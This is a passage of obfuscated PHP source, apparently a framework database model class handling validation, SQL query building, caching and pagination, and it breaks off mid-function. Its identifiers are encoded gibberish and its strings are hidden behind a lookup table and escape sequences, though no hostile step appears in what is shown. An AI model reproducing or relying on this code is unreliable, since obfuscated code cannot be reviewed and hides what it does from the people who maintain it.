$’Íáè’­[$Ü€¶ÎœÌ[0]]); } if ($îâÊÁêç[321] == $Ü€¶ÎœÌ[3]) { $’Íáè’­[$Ü€¶ÎœÌ[0]] = call_user_func_array($Ü€¶ÎœÌ[1], $«ä¬Â); } else { $’Íáè’­[$Ü€¶ÎœÌ[0]] = call_user_func_array(array(&$this, $Ü€¶ÎœÌ[1]), $«ä¬Â); } break; case $îâÊÁêç[273]: $’Íáè’­[$Ü€¶ÎœÌ[0]] = $’Íáè’­[$Ü€¶ÎœÌ[1]]; break; case $îâÊÁêç[323]: if ($îâÊÁêç[12] === $’Íáè’­[$Ü€¶ÎœÌ[0]]) { unset($’Íáè’­[$Ü€¶ÎœÌ[0]]); } break; case $îâÊÁêç[324]: default: $’Íáè’­[$Ü€¶ÎœÌ[0]] = $Ü€¶ÎœÌ[1]; } if (!1 === $’Íáè’­[$Ü€¶ÎœÌ[0]]) { unset($’Íáè’­[$Ü€¶ÎœÌ[0]]); } } } } return $’Íáè’­; } protected function autoValidation($ÕŸôˆáÜ, $”†…çêŞ) { $ÏŠº˜Ë =& $_SERVER[Ì¥ŞÒ°£]; if (!empty($this->options[$ÏŠº˜Ë[325]])) { $‹§ Èüİ = $this->options[$ÏŠº˜Ë[325]]; unset($this->options[$ÏŠº˜Ë[325]]); } elseif (!empty($this->_validate)) { $‹§ Èüİ = $this->_validate; } if (isset($‹§ Èüİ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($‹§ Èüİ as $£ö ÷“Ö => $‘·ûÆö) { if (empty($‘·ûÆö[5]) || $‘·ûÆö[5] == THINK_MODEL_BOTH || $‘·ûÆö[5] == $”†…çêŞ) { if (0 == strpos($‘·ûÆö[2], $ÏŠº˜Ë[326]) && strpos($‘·ûÆö[2], $ÏŠº˜Ë[327])) { $‘·ûÆö[2] = think_lang(substr($‘·ûÆö[2], 2, -1)); } $‘·ûÆö[3] = isset($‘·ûÆö[3]) ? $‘·ûÆö[3] : THINK_EXISTS_VALIDATE; $‘·ûÆö[4] = isset($‘·ûÆö[4]) ? $‘·ûÆö[4] : $ÏŠº˜Ë[328]; switch ($‘·ûÆö[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ÕŸôˆáÜ, $‘·ûÆö)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ÏŠº˜Ë[12] != trim($ÕŸôˆáÜ[$‘·ûÆö[0]])) { if (!1 === $this->_validationField($ÕŸôˆáÜ, $‘·ûÆö)) { return !1; } } break; default: if (isset($ÕŸôˆáÜ[$‘·ûÆö[0]])) { if (!1 === $this->_validationField($ÕŸôˆáÜ, $‘·ûÆö)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($”ñÜ¬¡, $ÔÌ±¿À·) { if (!1 === $this->_validationFieldItem($”ñÜ¬¡, $ÔÌ±¿À·)) { if ($this->patchValidate) { $this->error[$ÔÌ±¿À·[0]] = $ÔÌ±¿À·[2]; } else { $this->error = $ÔÌ±¿À·[2]; return !1; } } return; } protected function _validationFieldItem($—×öÔà, $á¿ÇÊÜÊ) { $²‹œŠ÷Ü =& $_SERVER[Ì¥ŞÒ°£]; switch (strtolower(trim($á¿ÇÊÜÊ[4]))) { case $²‹œŠ÷Ü[321]: case $²‹œŠ÷Ü[322]: $ŞÔ‡——„ = isset($á¿ÇÊÜÊ[6]) ? (array) $á¿ÇÊÜÊ[6] : array(); if (is_string($á¿ÇÊÜÊ[0]) && strpos($á¿ÇÊÜÊ[0], $²‹œŠ÷Ü[50])) { $á¿ÇÊÜÊ[0] = explode($²‹œŠ÷Ü[50], $á¿ÇÊÜÊ[0]); } if (is_array($á¿ÇÊÜÊ[0])) { foreach ($á¿ÇÊÜÊ[0] as $”£Ôáç“) { $ÉäÍêì[$”£Ôáç“] = $—×öÔà[$”£Ôáç“]; } array_unshift($ŞÔ‡——„, $ÉäÍêì); } else { array_unshift($ŞÔ‡——„, $—×öÔà[$á¿ÇÊÜÊ[0]]); } if ($²‹œŠ÷Ü[321] == $á¿ÇÊÜÊ[4]) { return call_user_func_array($á¿ÇÊÜÊ[1], $ŞÔ‡——„); } else { return call_user_func_array(array(&$this, $á¿ÇÊÜÊ[1]), $ŞÔ‡——„); } case $²‹œŠ÷Ü[329]: return $—×öÔà[$á¿ÇÊÜÊ[0]] == $—×öÔà[$á¿ÇÊÜÊ[1]]; case $²‹œŠ÷Ü[330]: if (is_string($á¿ÇÊÜÊ[0]) && strpos($á¿ÇÊÜÊ[0], $²‹œŠ÷Ü[50])) { $á¿ÇÊÜÊ[0] = explode($²‹œŠ÷Ü[50], $á¿ÇÊÜÊ[0]); } $ƒ¯Ø®é = array(); if (is_array($á¿ÇÊÜÊ[0])) { foreach ($á¿ÇÊÜÊ[0] as $”£Ôáç“) { $ƒ¯Ø®é[$”£Ôáç“] = $—×öÔà[$”£Ôáç“]; } } else { $ƒ¯Ø®é[$á¿ÇÊÜÊ[0]] = $—×öÔà[$á¿ÇÊÜÊ[0]]; } if (!empty($—×öÔà[$this->getPk()])) { $ƒ¯Ø®é[$this->getPk()] = array($²‹œŠ÷Ü[331], $—×öÔà[$this->getPk()]); } if ($this->where($ƒ¯Ø®é)->find()) { return !1; } return !0; default: return $this->check($—×öÔà[$á¿ÇÊÜÊ[0]], $á¿ÇÊÜÊ[1], $á¿ÇÊÜÊ[4]); } } public function check($Â…³â¦À, $¥í˜ğ‡€, $óÅ²ß·ı = "\162\x65\x67\145\170") { $¥àËûÄœ =& $_SERVER[Ì¥ŞÒ°£]; $óÅ²ß·ı = strtolower(trim($óÅ²ß·ı)); switch ($óÅ²ß·ı) { case $¥àËûÄœ[7]: case $¥àËûÄœ[332]: $Ä“ı–“· = is_array($¥í˜ğ‡€) ? $¥í˜ğ‡€ : explode($¥àËûÄœ[50], $¥í˜ğ‡€); return $óÅ²ß·ı == $¥àËûÄœ[7] ? in_array($Â…³â¦À, $Ä“ı–“·) : !in_array($Â…³â¦À, $Ä“ı–“·); case $¥àËûÄœ[333]: case $¥àËûÄœ[334]: if (is_array($¥í˜ğ‡€)) { $Ûôô•À = $¥í˜ğ‡€[0]; $…Ñ¶ºÌ” = $¥í˜ğ‡€[1]; } else { list($Ûôô•À, $…Ñ¶ºÌ”) = explode($¥àËûÄœ[50], $¥í˜ğ‡€); } return $óÅ²ß·ı == $¥àËûÄœ[333] ? $Â…³â¦À >= $Ûôô•À && $Â…³â¦À <= $…Ñ¶ºÌ” : $Â…³â¦À < $Ûôô•À || $Â…³â¦À > $…Ñ¶ºÌ”; case $¥àËûÄœ[335]: case $¥àËûÄœ[336]: return $óÅ²ß·ı == $¥àËûÄœ[335] ? $Â…³â¦À == $¥í˜ğ‡€ : $Â…³â¦À != $¥í˜ğ‡€; case $¥àËûÄœ[337]: $æôŸ‹î‰ = mb_strlen($Â…³â¦À, $¥àËûÄœ[338]); if (strpos($¥í˜ğ‡€, $¥àËûÄœ[50])) { list($Ûôô•À, $…Ñ¶ºÌ”) = explode($¥àËûÄœ[50], $¥í˜ğ‡€); return $æôŸ‹î‰ >= $Ûôô•À && $æôŸ‹î‰ <= $…Ñ¶ºÌ”; } else { return $æôŸ‹î‰ == $¥í˜ğ‡€; } case $¥àËûÄœ[339]: list($ú»ûºœ, $å™åØó) = explode($¥àËûÄœ[50], $¥í˜ğ‡€); if (!is_numeric($ú»ûºœ)) { $ú»ûºœ = strtotime($ú»ûºœ); } if (!is_numeric($å™åØó)) { $å™åØó = strtotime($å™åØó); } return NOW_TIME >= $ú»ûºœ && NOW_TIME <= $å™åØó; case $¥àËûÄœ[340]: return in_array(get_client_ip(), explode($¥àËûÄœ[50], $¥í˜ğ‡€)); case $¥àËûÄœ[341]: return !in_array(get_client_ip(), explode($¥àËûÄœ[50], $¥í˜ğ‡€)); case $¥àËûÄœ[328]: default: return $this->regex($Â…³â¦À, $¥í˜ğ‡€); } } public function query($“À†Áß…, $œ¾çÜ = false) { $ö¶—Õ¬ =& $_SERVER[Ì¥ŞÒ°£]; if (!is_bool($œ¾çÜ) && !is_array($œ¾çÜ)) { $œ¾çÜ = func_get_args(); array_shift($œ¾çÜ); } $“À†Áß… = str_replace(array($ö¶—Õ¬[231], $ö¶—Õ¬[342]), $ö¶—Õ¬[53], $“À†Áß…); $“À†Áß… = $this->parseSql($“À†Áß…, $œ¾çÜ); return $this->db->query($“À†Áß…); } public function execute($Œ‹ÏúÈ«, $•¶ãúÊ³ = false) { if (!is_bool($•¶ãúÊ³) && !is_array($•¶ãúÊ³)) { $•¶ãúÊ³ = func_get_args(); array_shift($•¶ãúÊ³); } $Œ‹ÏúÈ« = $this->parseSql($Œ‹ÏúÈ«, $•¶ãúÊ³); return $this->db->execute($Œ‹ÏúÈ«); } protected function parseSql($¥ÎŠ™Ù¶, $Å‚¹ Ş×) { $ÕöğÅÏ =& $_SERVER[Ì¥ŞÒ°£]; if (!0 === $Å‚¹ Ş×) { $¾Ôâ‰ÃÎ = $this->_parseOptions(); $¥ÎŠ™Ù¶ = $this->db->parseSql($¥ÎŠ™Ù¶, $¾Ôâ‰ÃÎ); } elseif (is_array($Å‚¹ Ş×)) { $Å‚¹ Ş× = array_map(array($this->db, $ÕöğÅÏ[343]), $Å‚¹ Ş×); $¥ÎŠ™Ù¶ = vsprintf($¥ÎŠ™Ù¶, $Å‚¹ Ş×); } else { $¥ÎŠ™Ù¶ = strtr($¥ÎŠ™Ù¶, array($ÕöğÅÏ[344] => $this->getTableName(), $ÕöğÅÏ[345] => think_config($ÕöğÅÏ[244]))); } $this->db->setModel($this->name); return $¥ÎŠ™Ù¶; } public function db($ªø·’ÕÕ = '', $à—áÎè = '', $ä·¸´·ı = array()) { $êÉˆúá =& $_SERVER[Ì¥ŞÒ°£]; if ($êÉˆúá[12] === $ªø·’ÕÕ && $this->db) { return $this->db; } static $»”ºõãô = array(); static $¢¦Ÿ¢½Ã = array(); if (!isset($¢¦Ÿ¢½Ã[$ªø·’ÕÕ]) || isset($¢¦Ÿ¢½Ã[$ªø·’ÕÕ]) && $à—áÎè && $»”ºõãô[$ªø·’ÕÕ] != $à—áÎè) { if (!empty($à—áÎè) && is_string($à—áÎè) && !1 === strpos($à—áÎè, $êÉˆúá[8])) { $à—áÎè = think_config($à—áÎè); } $ªø·’ÕÕ = think_guid($à—áÎè); $¢¦Ÿ¢½Ã[$ªø·’ÕÕ] = Db::getInstance($à—áÎè); } elseif (NULL === $à—áÎè) { $¢¦Ÿ¢½Ã[$ªø·’ÕÕ]->close(); unset($¢¦Ÿ¢½Ã[$ªø·’ÕÕ]); return; } if (!empty($ä·¸´·ı)) { if (is_string($ä·¸´·ı)) { parse_str($ä·¸´·ı, $ä·¸´·ı); } foreach ($ä·¸´·ı as $²ªú›Ãİ => $†„ïæ¿–) { $this->setProperty($²ªú›Ãİ, $†„ïæ¿–); } } $»”ºõãô[$ªø·’ÕÕ] = $à—áÎè; $this->db = $¢¦Ÿ¢½Ã[$ªø·’ÕÕ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Ãòş¬ = get_class($this); if ($Ãòş¬ == $_SERVER[Ì¥ŞÒ°£][346]) { return $this->name; } $this->name = substr($Ãòş¬, 0, -5); } return $this->name; } public function getTableName() { $§óâÀ‘ =& $_SERVER[Ì¥ŞÒ°£]; if (empty($this->trueTableName)) { $·ƒƒ„· = !empty($this->tablePrefix) ? $this->tablePrefix : $§óâÀ‘[12]; if (!empty($this->tableName)) { $·ƒƒ„· .= $this->tableName; } else { $·ƒƒ„· .= think_parse_name($this->name); } $this->trueTableName = strtolower($·ƒƒ„·); } return (!empty($this->dbName) ? $this->dbName . $§óâÀ‘[10] : $§óâÀ‘[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $˜ò—€Ç¼ =& $_SERVER[Ì¥ŞÒ°£]; return isset($this->fields[$˜ò—€Ç¼[251]]) ? $this->fields[$˜ò—€Ç¼[251]] : $this->pk; } public function getDbFields() { $Ğ®±™ë =& $_SERVER[Ì¥ŞÒ°£]; if (isset($this->options[$Ğ®±™ë[279]])) { $õîÑÀæ = $this->db->getFields($this->options[$Ğ®±™ë[279]]); return $õîÑÀæ ? array_keys($õîÑÀæ) : !1; } if ($this->fields) { $õîÑÀæ = $this->fields; unset($õîÑÀæ[$Ğ®±™ë[250]], $õîÑÀæ[$Ğ®±™ë[251]], $õîÑÀæ[$Ğ®±™ë[252]], $õîÑÀæ[$Ğ®±™ë[249]]); return $õîÑÀæ; } return !1; } public function data($–“Ş÷Ñ¹ = '') { $¥ÊÌ¡Òë =& $_SERVER[Ì¥ŞÒ°£]; if ($¥ÊÌ¡Òë[12] === $–“Ş÷Ñ¹ && !empty($this->data)) { return $this->data; } if (is_object($–“Ş÷Ñ¹)) { $–“Ş÷Ñ¹ = get_object_vars($–“Ş÷Ñ¹); } elseif (is_string($–“Ş÷Ñ¹)) { parse_str($–“Ş÷Ñ¹, $–“Ş÷Ñ¹); } elseif (!is_array($–“Ş÷Ñ¹)) { think_exception(think_lang($¥ÊÌ¡Òë[271])); } $this->data = $–“Ş÷Ñ¹; return $this; } public function join($ºË±ÜèÄ) { $ñ¯¿â =& $_SERVER[Ì¥ŞÒ°£]; if (is_array($ºË±ÜèÄ)) { $this->options[$ñ¯¿â[282]] = $ºË±ÜèÄ; } elseif (!empty($ºË±ÜèÄ)) { $this->options[$ñ¯¿â[282]][] = $ºË±ÜèÄ; } return $this; } public function union($Â»ª¶‹ƒ, $“şø÷›Ï = false) { $æŠ¤™ =& $_SERVER[Ì¥ŞÒ°£]; if (empty($Â»ª¶‹ƒ)) { return $this; } if ($“şø÷›Ï) { $this->options[$æŠ¤™[347]][$æŠ¤™[348]] = !0; } if (is_object($Â»ª¶‹ƒ)) { $Â»ª¶‹ƒ = get_object_vars($Â»ª¶‹ƒ); } if (is_string($Â»ª¶‹ƒ)) { $‘èÌÂúæ = $Â»ª¶‹ƒ; } elseif (is_array($Â»ª¶‹ƒ)) { if (isset($Â»ª¶‹ƒ[0])) { $this->options[$æŠ¤™[347]] = array_merge($this->options[$æŠ¤™[347]], $Â»ª¶‹ƒ); return $this; } else { $‘èÌÂúæ = $Â»ª¶‹ƒ; } } else { think_exception(think_lang($æŠ¤™[271])); } $this->options[$æŠ¤™[347]][] = $‘èÌÂúæ; return $this; } public function cache($É¿à…î¨ = true, $‚×…¹ø¥ = null, $³£áäˆ˜ = '') { $¯Şº½ı– =& $_SERVER[Ì¥ŞÒ°£]; if (!1 !== $É¿à…î¨) { $this->options[$¯Şº½ı–[349]] = array($¯Şº½ı–[94] => $É¿à…î¨, $¯Şº½ı–[339] => $‚×…¹ø¥, $¯Şº½ı–[33] => $³£áäˆ˜); } return $this; } public function field($â«˜´ù´, $âÕˆ§–“ = false) { $ªøÃıÂÁ =& $_SERVER[Ì¥ŞÒ°£]; if (!0 === $â«˜´ù´) { $ÌÏÜ‹ºş = $this->getDbFields(); $â«˜´ù´ = $ÌÏÜ‹ºş ? $ÌÏÜ‹ºş : $ªøÃıÂÁ[188]; } elseif ($âÕˆ§–“) { if (is_string($â«˜´ù´)) { $â«˜´ù´ = explode($ªøÃıÂÁ[50], $â«˜´ù´); } $ÌÏÜ‹ºş = $this->getDbFields(); $â«˜´ù´ = $ÌÏÜ‹ºş ? array_diff($ÌÏÜ‹ºş, $â«˜´ù´) : $â«˜´ù´; } $this->options[$ªøÃıÂÁ[273]] = $â«˜´ù´; return $this; } public function scope($Á›ÓàôÂ = '', $»Ñ¹šğ· = NULL) { $Éã‡¶Ó­ =& $_SERVER[Ì¥ŞÒ°£]; if ($Éã‡¶Ó­[12] === $Á›ÓàôÂ) { if (isset($this->_scope[$Éã‡¶Ó­[37]])) { $“Ş¬¢½Â = $this->_scope[$Éã‡¶Ó­[37]]; } else { return $this; } } elseif (is_string($Á›ÓàôÂ)) { $õ—á•ğö = explode($Éã‡¶Ó­[50], $Á›ÓàôÂ); $“Ş¬¢½Â = array(); foreach ($õ—á•ğö as $€÷çÙ­â) { if (!isset($this->_scope[$€÷çÙ­â])) { continue; } $“Ş¬¢½Â = array_merge($“Ş¬¢½Â, $this->_scope[$€÷çÙ­â]); } if (!empty($»Ñ¹šğ·) && is_array($»Ñ¹šğ·)) { $“Ş¬¢½Â = array_merge($“Ş¬¢½Â, $»Ñ¹šğ·); } } elseif (is_array($Á›ÓàôÂ)) { $“Ş¬¢½Â = $Á›ÓàôÂ; } if (is_array($“Ş¬¢½Â) && !empty($“Ş¬¢½Â)) { $this->options = array_merge($this->options, array_change_key_case($“Ş¬¢½Â)); } return $this; } public function where($øÕ‘ı…§, $²óĞ·‚ = null) { $–éÙ¿ò¶ =& $_SERVER[Ì¥ŞÒ°£]; if (!is_null($²óĞ·‚) && is_string($øÕ‘ı…§)) { if (!is_array($²óĞ·‚)) { $²óĞ·‚ = func_get_args(); array_shift($²óĞ·‚); } $²óĞ·‚ = array_map(array($this->db, $–éÙ¿ò¶[343]), $²óĞ·‚); $øÕ‘ı…§ = vsprintf($øÕ‘ı…§, $²óĞ·‚); } elseif (is_object($øÕ‘ı…§)) { $øÕ‘ı…§ = get_object_vars($øÕ‘ı…§); } elseif (is_array($øÕ‘ı…§)) { foreach ($øÕ‘ı…§ as $İŒ­´àµ => $™ìĞ¥Ï©) { if ((is_numeric($İŒ­´àµ) || !$İŒ­´àµ) && is_string($™ìĞ¥Ï©)) { if (strpos($™ìĞ¥Ï©, $–éÙ¿ò¶[350]) === 0) { continue; } think_trace($–éÙ¿ò¶[351], $–éÙ¿ò¶[12], $–éÙ¿ò¶[49]); die; } } } if (is_string($øÕ‘ı…§) && $–éÙ¿ò¶[12] != $øÕ‘ı…§) { $©š‰Ëµè = array(); $©š‰Ëµè[$–éÙ¿ò¶[352]] = $øÕ‘ı…§; $øÕ‘ı…§ = $©š‰Ëµè; } if (isset($this->options[$–éÙ¿ò¶[275]])) { $this->options[$–éÙ¿ò¶[275]] = array_merge($this->options[$–éÙ¿ò¶[275]], $øÕ‘ı…§); } else { $this->options[$–éÙ¿ò¶[275]] = $øÕ‘ı…§; } return $this; } public function limit($Î¯¯ÀÊ¥, $Üêáº±ï = null) { $ãÄí¼şÊ =& $_SERVER[Ì¥ŞÒ°£]; $this->options[$ãÄí¼şÊ[292]] = is_null($Üêáº±ï) ? $Î¯¯ÀÊ¥ : $Î¯¯ÀÊ¥ . $ãÄí¼şÊ[50] . $Üêáº±ï; return $this; } public function page($§ €Ú™°, $Å©­à§¦ = null) { $÷Ã¼‚ûñ =& $_SERVER[Ì¥ŞÒ°£]; $this->options[$÷Ã¼‚ûñ[353]] = is_null($Å©­à§¦) ? $§ €Ú™° : $§ €Ú™° . $÷Ã¼‚ûñ[50] . $Å©­à§¦; return $this; } public function comment($Ôî…ÄÅÏ) { $this->options[$_SERVER[Ì¥ŞÒ°£][354]] = $Ôî…ÄÅÏ; return $this; } public function setProperty($ö¬‰øé¹, $‹…ØÉ¾) { if (property_exists($this, $ö¬‰øé¹)) { $this->{$ö¬‰øé¹} = $‹…ØÉ¾; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\x69\x66\x79\124\x69\155\145", "\164\x69\155\x65", "\151\x6e\163\x65\x72\164\x2c\165\160\144\x61\x74\145", "\146\165\156\x63\x74\151\157\156"), array("\143\x72\x65\141\x74\145\x54\151\155\145", "\x74\x69\x6d\x65", "\x69\156\163\x65\x72\x74", "\x66\x75\156\143\x74\x69\x6f\156")); public function setDataAuto($£³ùÈ×ó) { $this->dataAuto = $£³ùÈ×ó; } public function __construct($Ñöğˆœè = '', $†ëÎĞÓ» = '', $Ù¸ğƒÏ = '') { parent::__construct($Ñöğˆœè, $†ëÎĞÓ», $Ù¸ğƒÏ); } protected $tableMeta = array(); protected function _beforeInsert(&$¹üªşñÜ, $ÜÆ§¾˜€) { $ç×à… =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->checkDataAutoHas($ç×à…[355])) { return; } $this->dataBeforeFilter($¹üªşñÜ, $ç×à…[355]); } protected function _beforeUpdate(&$ø…Íœ›, $ĞòáİÈ·) { $°³ø‰ÁØ =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->checkDataAutoHas($°³ø‰ÁØ[356])) { return; } $this->dataBeforeFilter($ø…Íœ›, $°³ø‰ÁØ[356]); } protected function _afterSelect(&$ñµìÀÈ, $È´ ã®“) { if (!is_array($ñµìÀÈ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ì¥ŞÒ°£][357])) { return; } foreach ($ñµìÀÈ as &$Åô„ç¸ò) { $this->dataAfterFilter($Åô„ç¸ò); } unset($Åô„ç¸ò); } protected function _afterFind(&$…º ü—, $°·éö¹š) { if (!is_array($…º ü—)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ì¥ŞÒ°£][357])) { return; } $this->dataAfterFilter($…º ü—); } public static function textEncode($”•˜£ñµ) { if (!$”•˜£ñµ) { return $”•˜£ñµ; } $…‘á¬½Ğ = json_encode($”•˜£ñµ); $…‘á¬½Ğ = preg_replace_callback($_SERVER[Ì¥ŞÒ°£][358], function ($Ÿéõãù¡) { return addslashes($Ÿéõãù¡[0]); }, $…‘á¬½Ğ); return json_decode($…‘á¬½Ğ); } public static function textDecode($ñÖêÕÔã) { $Á§î´œ =& $_SERVER[Ì¥ŞÒ°£]; $áà€¾ñ¯ = json_encode($ñÖêÕÔã); $áà€¾ñ¯ = preg_replace_callback($Á§î´œ[359], function ($ì“‡“…Ü) { return $_SERVER[Ì¥ŞÒ°£][97]; }, $áà€¾ñ¯); return json_decode($áà€¾ñ¯); } public function setAutoIncrement($…å‘†Ë) { $ÄéÜ™²æ = array($this->getPk() => $…å‘†Ë); $Ò ØĞ = $this->data($ÄéÜ™²æ)->add(); if ($Ò ØĞ) { $this->delete($Ò ØĞ); } } public function getAutoIncrement() { $ø¯Šî’ = $this->getTableName(); $ê£ò¥¾ = $this->max($this->getPk()); $‹å¿ÎìÍ = $this->query("\x73\x68\157\167\x20\x74\x61\x62\x6c\x65\x20\163\164\141\x74\x75\x73\x20\167\x68\145\162\145\40\x4e\141\x6d\x65\75\47{$ø¯Šî’}\x27"); $áø‰ŞÙ¸ = $‹å¿ÎìÍ[0][$_SERVER[Ì¥ŞÒ°£][360]]; $¤¶‘ç¤ = max($ê£ò¥¾, $áø‰ŞÙ¸); return $¤¶‘ç¤; } protected function _callBefore($«òşÈ­·, $½Û½É…Ö) { return $this->cacheCallCheck($«òşÈ­·, $½Û½É…Ö, !1); } protected function _callAfter($Íñ¤èÑ½, $Ø‰Õ„ÂÁ) { return $this->cacheCallCheck($Íñ¤èÑ½, $Ø‰Õ„ÂÁ, !0); } protected function cacheFunctionAlias($ ³Êç–ë) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($í†Ë¢Æ, $·°ÜÀ§£, $¦˜åß÷Š = false) { $õìÆ„í’ = $this->cacheFunctionAlias($·°ÜÀ§£); if (!$õìÆ„í’) { return; } foreach ($õìÆ„í’ as $Ü´şæø‚ => $¸şœ‘£ñ) { $Õ¾µ•˜ = $¸şœ‘£ñ[0]; $„ ±§èà = explode($_SERVER[Ì¥ŞÒ°£][50], $¸şœ‘£ñ[1]); if ($í†Ë¢Æ == $Ü´şæø‚) { return $this->cacheFunctionGet($Ü´şæø‚, $Õ¾µ•˜); } if ($¦˜åß÷Š && in_array($í†Ë¢Æ, $„ ±§èà)) { $this->cacheFunctionClear($Ü´şæø‚, $Õ¾µ•˜); } } } public function cacheFunctionGet($ÎñÃöÔ, $ãáµ‘‡) { $¶¢¨üÒ¼ = $this->cacheKeyMake($ÎñÃöÔ, $ãáµ‘‡); $ßêœ‡–Õ = Cache::get($¶¢¨üÒ¼); if (!is_array($ßêœ‡–Õ)) { $ßêœ‡–Õ = call_user_func_array(array($this, $ÎñÃöÔ), array($ãáµ‘‡, !0)); Cache::set($¶¢¨üÒ¼, $ßêœ‡–Õ); } return $ßêœ‡–Õ; } public function cacheFunctionClear($ü´—ŠÁ„, $ÎµĞ…¡¿) { $”§ú¨ = $ÎµĞ…¡¿; if (!is_array($ÎµĞ…¡¿)) { $”§ú¨ = array($ÎµĞ…¡¿); } foreach ($”§ú¨ as $Õ¿«ÉÀŸ) { $Û€ê‘¨ = $this->cacheKeyMake($ü´—ŠÁ„, $Õ¿«ÉÀŸ); Cache::remove($Û€ê‘¨); } } private function cacheKeyMake($Êê¤¹Á•, $Í÷¦ÅÈŒ) { $«œƒˆæğ =& $_SERVER[Ì¥ŞÒ°£]; return get_class($this) . $«œƒˆæğ[11] . $Êê¤¹Á• . $«œƒˆæğ[361] . $Í÷¦ÅÈŒ; } protected function selectPageReset() { $¿•»ø× =& $_SERVER[Ì¥ŞÒ°£]; if (isset($GLOBALS[$¿•»ø×[362]])) { return; } $GLOBALS[$¿•»ø×[362]] = isset($GLOBALS[$¿•»ø×[7]][$¿•»ø×[363]]) ? $GLOBALS[$¿•»ø×[7]][$¿•»ø×[363]] : !1; $GLOBALS[$¿•»ø×[364]] = isset($GLOBALS[$¿•»ø×[7]][$¿•»ø×[353]]) ? $GLOBALS[$¿•»ø×[7]][$¿•»ø×[353]] : !1; $GLOBALS[$¿•»ø×[7]][$¿•»ø×[363]] = !1; $GLOBALS[$¿•»ø×[7]][$¿•»ø×[353]] = !1; } protected function selectPageRestore() { $‡è÷ù… =& $_SERVER[Ì¥ŞÒ°£]; if (!isset($GLOBALS[$‡è÷ù…[362]])) { return; } $GLOBALS[$‡è÷ù…[7]][$‡è÷ù…[363]] = $GLOBALS[$‡è÷ù…[362]]; $GLOBALS[$‡è÷ù…[7]][$‡è÷ù…[353]] = $GLOBALS[$‡è÷ù…[364]]; if ($GLOBALS[$‡è÷ù…[7]][$‡è÷ù…[363]] === !1) { unset($GLOBALS[$‡è÷ù…[7]][$‡è÷ù…[363]]); } if ($GLOBALS[$‡è÷ù…[7]][$‡è÷ù…[353]] === !1) { unset($GLOBALS[$‡è÷ù…[7]][$‡è÷ù…[353]]); } unset($GLOBALS[$‡è÷ù…[362]]); unset($GLOBALS[$‡è÷ù…[364]]); } protected function selectPage($óİù³ = 200, $ó¢ç¤öı = 1) { $Ò¸ºïÀİ =& $_SERVER[Ì¥ŞÒ°£]; global $in; $¯ø±Ø„ = $this->optionsValue(); $ËÌ¦é¥ = 50000; $óİù³ = isset($in[$Ò¸ºïÀİ[363]]) && $in[$Ò¸ºïÀİ[363]] ? $in[$Ò¸ºïÀİ[363]] : $óİù³; if ($óİù³ === -1) { $in[$Ò¸ºïÀİ[363]] = !1; $ËÌ¦é¥ = 100000000; $óİù³ = $ËÌ¦é¥; } $àÈ•Æ‚‚ = $¯ø±Ø„; $àÈ•Æ‚‚[$Ò¸ºïÀİ[365]] = array(); $óİù³ = intval($óİù³); $óİù³ = $óİù³ <= 5 ? 5 : ($óİù³ >= $ËÌ¦é¥ ? $ËÌ¦é¥ : $óİù³); $ó¢ç¤öı = intval(isset($in[$Ò¸ºïÀİ[353]]) && $in[$Ò¸ºïÀİ[353]] ? $in[$Ò¸ºïÀİ[353]] : $ó¢ç¤öı); $ó¢ç¤öı = $ó¢ç¤öı <= 1 ? 1 : $ó¢ç¤öı; $“ö±“º¿ = array(); $À«ş”÷× = 1; if ($ó¢ç¤öı == 1 && $À«ş”÷×) { $this->optionsValue($¯ø±Ø„); $“ö±“º¿ = $this->page($ó¢ç¤öı, $óİù³)->select(); $œß™€ĞŸ = is_array($“ö±“º¿) ? count($“ö±“º¿) : 0; if ($œß™€ĞŸ < $óİù³) { $ë«àö = 1; } else { $this->optionsValue($àÈ•Æ‚‚); $œß™€ĞŸ = intval($this->count()); $ë«àö = ceil($œß™€ĞŸ / $óİù³); } } else { $this->optionsValue($àÈ•Æ‚‚); $œß™€ĞŸ = intval($this->count()); $ë«àö = ceil($œß™€ĞŸ / $óİù³); $ó¢ç¤öı = $ó¢ç¤öı >= $ë«àö ? $ë«àö : $ó¢ç¤öı; $this->optionsValue($¯ø±Ø„); $“ö±“º¿ = $this->page($ó¢ç¤öı, $óİù³)->select(); } if (!is_array($“ö±“º¿)) { $“ö±“º¿ = array(); } if ($ë«àö == 1) { $œß™€ĞŸ = count($“ö±“º¿); } $İ¾˜áÅó = array($Ò¸ºïÀİ[366] => array($Ò¸ºïÀİ[367] => $œß™€ĞŸ, $Ò¸ºïÀİ[363] => $óİù³, $Ò¸ºïÀİ[353] => $ó¢ç¤öı, $Ò¸ºïÀİ[368] => $ë«àö), $Ò¸ºïÀİ[369] => $“ö±“º¿); return $İ¾˜áÅó; } protected function checkLength($À £„—Ğ, $³‰¥ãÕ = 0, $˜Ç»ü™ = '') { $ÒÌÌó =& $_SERVER[Ì¥ŞÒ°£]; $³‰¥ãÕ = $³‰¥ãÕ ? $³‰¥ãÕ : 65536; if (!$À £„—Ğ || strlen($À £„—Ğ) < $³‰¥ãÕ) { return; } $˜Ç»ü™ = $˜Ç»ü™ ? $˜Ç»ü™ . $ÒÌÌó[71] : $ÒÌÌó[12]; show_json($˜Ç»ü™ . LNG($ÒÌÌó[370]) . "\50{$³‰¥ãÕ}\51", !1); } protected function metaSet($³Êı‹, $è„¸àÖ‘ = null, $Ç‘¶…ŸÕ = null) { $Å²ÌÒó =& $_SERVER[Ì¥ŞÒ°£]; if 